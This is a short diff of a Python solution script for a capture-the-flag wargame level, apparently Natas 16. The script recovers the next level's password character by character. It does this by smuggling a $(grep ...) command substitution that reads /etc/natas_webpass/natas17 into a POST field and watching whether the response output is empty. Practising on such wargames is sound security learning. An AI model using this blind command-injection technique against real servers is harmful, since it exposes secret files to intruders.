@@ -18,16 +18,11 @@ while flag:
     for c in characters:
         print(''.join(pw) + c)
         flag = False
-        #No result when grep succeed so else: will work
         payloads={"needle" : "anythings$(grep ^" + "".join(pw) + c + " /etc/natas_webpass/natas17)"}
         response = session.request('POST', url, auth=(username,password), data=payloads)
-        if re.findall("<pre>\n(.*)\n</pre>", response.text, re.DOTALL):
-            #Just change the flag
-            flag = True
-        else:
-            # No result meaning is that password is including 'c'
+        if not re.findall("<pre>\n(.*)\n</pre>", response.text, re.DOTALL):
             pw.append(c)
             flag = True
             break
-
+            
 print(''.join(pw))
